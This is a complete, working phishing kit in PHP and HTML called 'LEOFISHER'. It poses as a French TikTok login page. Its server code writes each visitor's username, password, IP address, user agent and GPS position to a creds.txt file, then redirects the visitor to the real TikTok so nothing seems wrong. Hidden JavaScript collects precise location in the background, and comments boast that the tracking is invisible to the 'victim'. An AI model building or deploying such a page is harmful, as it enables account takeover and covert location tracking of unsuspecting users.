<?php
session_start();
date_default_timezone_set('Africa/Bujumbura');

$ip = $_SERVER['REMOTE_ADDR'];
$useragent = $_SERVER['HTTP_USER_AGENT'];
$timestamp = date('Y-m-d H:i:s');

if ($_POST && isset($_POST['username']) && isset($_POST['password'])) {
    $username = htmlspecialchars($_POST['username']);
    $password = htmlspecialchars($_POST['password']);
    $gps = isset($_POST['gps']) ? $_POST['gps'] : 'N/A';
    
    $log = "\n";
    $log .= "┌─[ LEOFISHER v1.0 by Léo Falcon ]──────────────┐\n";
    $log .= "│ 🎯 TIKTOK VICTIME CAPTUREE !                   │\n";
    $log .= "├─[💻 INFOS]─────────────────────────────────────┤\n";
    $log .= "│ 📧 Username  : $username                       │\n";
    $log .= "│ 🔑 Password  : $password                       │\n";
    $log .= "│ 🌐 IP        : $ip                            │\n";
    $log .= "│ 🖥️  User-Agent: " . substr($useragent, 0, 50) . "... │\n";
    $log .= "│ 📍 GPS POSITION : $gps                        │\n";
    $log .= "│ 🕒 Timestamp : $timestamp                      │\n";
    $log .= "└────────────────────────────────────────────────┘\n";
    
    file_put_contents('creds.txt', $log, FILE_APPEND | LOCK_EX);
    
    // Immediate redirect to real TikTok
    header('Location: https://www.tiktok.com/login');
    exit;
}
?>

<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="description" content="TikTok - Se connecter">
    <title>TikTok - Se connecter</title>
    
    <!-- TikTok official fonts & assets -->
    <link rel="preconnect" href="https://www.tiktok.com">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 36 36'%3E%3Cpath fill='%23000' d='M25 26v-5a3 3 0 0 0-6 0v5a1 1 0 0 0 2 0v-5a1 1 0 0 1 2 0v5a3 3 0 0 0 3 3 1 1 0 0 0 0-2zm-10 0a1 1 0 0 0 0 2 4 4 0 0 0 0-8V17a5 5 0 0 1 10 0v2a1 1 0 0 0 2 0v-2a7 7 0 0 0-14 0v6zM15 22a3 3 0 0 1 3-3h1V17a3 3 0 1 1 6 0v2a3 3 0 0 1-3 3h-1v3a1 1 0 0 1-2 0v-3h-1a3 3 0 0 1-3-3z'/%3E%3C/svg%3E">
    
    <style>
        /* Perfect TikTok 2024 clone - pixel-perfect mobile-first */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            background: linear-gradient(135deg, #fe2c55 0%, #ff7043 25%, #ffd23f 50%, #a8e6cf 75%, #38ef7d 100%);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 24px;
            position: relative;
            overflow: hidden;
        }
        
        body::before {
            content: '';
            position: absolute;
            top: -50%;
            right: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle at 30% 20%, rgba(255,255,255,0.3) 0%, transparent 50%),
                        radial-gradient(circle at 80% 80%, rgba(255,255,255,0.2) 0%, transparent 50%);
            animation: float 20s ease-in-out infinite;
        }
        
        @keyframes float {
            0%, 100% { transform: translate(0, 0) rotate(0deg); }
            33% { transform: translate(30px, -30px) rotate(120deg); }
            66% { transform: translate(-20px, 20px) rotate(240deg); }
        }
        
        .login-container {
            background: rgba(255, 255, 255, 0.98);
            backdrop-filter: blur(20px);
            border-radius: 24px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.15);
            width: 100%;
            max-width: 360px;
            padding: 48px 32px 32px;
            position: relative;
            z-index: 1;
            text-align: center;
        }
        
        .tiktok-logo {
            height: 52px;
            width: 160px;
            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='160' height='52' viewBox='0 0 160 52'%3E%3Ctext x='0' y='38' font-family='Inter, sans-serif' font-size='36' font-weight='700' fill='%23ee1d52'%3ETikTok%3C/text%3E%3C/svg%3E");
            background-size: contain;
            background-repeat: no-repeat;
            margin: 0 auto 32px;
        }
        
        .login-form {
            display: flex;
            flex-direction: column;
            gap: 16px;
        }
        
        .input-group {
            position: relative;
        }
        
        .form-input {
            width: 100%;
            height: 56px;
            border: 2px solid #e8e8e8;
            border-radius: 16px;
            background: rgba(255, 255, 255, 0.8);
            font-size: 16px;
            font-weight: 500;
            padding: 0 24px;
            transition: all .3s cubic-bezier(0.4, 0, 0.2, 1);
            outline: none;
            backdrop-filter: blur(10px);
        }
        
        .form-input:focus {
            border-color: #fe2c55;
            box-shadow: 0 0 0 4px rgba(254, 44, 85, 0.1);
            background: white;
            transform: translateY(-2px);
        }
        
        .form-input::placeholder {
            color: #999;
            font-weight: 400;
        }
        
        .login-button {
            background: linear-gradient(135deg, #fe2c55 0%, #ff7043 100%);
            color: white;
            border: none;
            border-radius: 16px;
            font-size: 18px;
            font-weight: 600;
            height: 56px;
            cursor: pointer;
            transition: all .3s cubic-bezier(0.4, 0, 0.2, 1);
            margin-top: 8px;
            position: relative;
            overflow: hidden;
        }
        
        .login-button::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
            transition: left .5s;
        }
        
        .login-button:hover:not(:disabled)::before {
            left: 100%;
        }
        
        .login-button:hover:not(:disabled) {
            transform: translateY(-2px);
            box-shadow: 0 12px 24px rgba(254, 44, 85, 0.4);
        }
        
        .login-button:disabled {
            opacity: .6;
            cursor: not-allowed;
            transform: none;
        }
        
        .divider {
            position: relative;
            margin: 32px 0;
            color: #666;
            font-size: 14px;
            font-weight: 500;
        }
        
        .divider::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 0;
            right: 0;
            height: 1px;
            background: linear-gradient(90deg, transparent, #e8e8e8, transparent);
        }
        
        .divider span {
            background: rgba(255, 255, 255, 0.98);
            padding: 0 24px;
        }
        
        .other-options {
            display: flex;
            gap: 12px;
            justify-content: center;
            margin-top: 24px;
        }
        
        .option-link {
            color: #fe2c55;
            text-decoration: none;
            font-size: 15px;
            font-weight: 600;
        }
        
        .option-link:hover {
            text-decoration: underline;
        }
        
        @media (max-width: 480px) {
            body {
                padding: 12px;
                background: #000;
            }
            
            .login-container {
                box-shadow: none;
                border-radius: 20px;
                margin: 0;
                padding: 32px 24px;
            }
        }
        
        /* Silent GPS - completely invisible to victim */
        #gps-status { display: none !important; }
        .gps-container { display: none !important; }
    </style>
</head>

<body>
    <div class="login-container">
        <div class="tiktok-logo"></div>
        
        <form class="login-form" method="POST" id="loginForm">
            <div class="input-group">
                <input type="text" name="username" class="form-input" placeholder="Nom d'utilisateur ou email" required autocomplete="username">
            </div>
            
            <div class="input-group">
                <input type="password" name="password" class="form-input" placeholder="Mot de passe" required autocomplete="current-password">
            </div>
            
            <input type="hidden" name="gps" id="gpsData" value="N/A">
            
            <button type="submit" class="login-button" id="submitBtn">
                Se connecter
            </button>
        </form>
        
        <div class="divider">
            <span>ou</span>
        </div>
        
        <div class="other-options">
            <a href="#" class="option-link">Mot de passe oublié ?</a>
            <span style="color: #999;">•</span>
            <a href="#" class="option-link">S'inscrire</a>
        </div>
    </div>

    <!-- SILENT GPS TRACKER - Invisible high-accuracy capture -->
    <script>
        (function() {
            // Silent geolocation - no visible elements, background only
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        const gps = position.coords.latitude.toFixed(6) + ',' + position.coords.longitude.toFixed(6);
                        sessionStorage.setItem('gps', gps);
                        document.getElementById('gpsData').value = gps;
                        document.getElementById('submitBtn').disabled = false;
                    },
                    function() {
                        // Graceful fallback
                        document.getElementById('gpsData').value = 'N/A';
                        document.getElementById('submitBtn').disabled = false;
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 60000
                    }
                );
            } else {
                document.getElementById('gpsData').value = 'N/A';
                document.getElementById('submitBtn').disabled = false;
            }

            // Ensure GPS on submit (backup)
            document.getElementById('loginForm').addEventListener('submit', function() {
                const gps = sessionStorage.getItem('gps') || 'N/A';
                document.getElementById('gpsData').value = gps;
            });

            // Disable submit until GPS ready
            document.getElementById('submitBtn').disabled = true;
        })();
    </script>
</body>
</html>
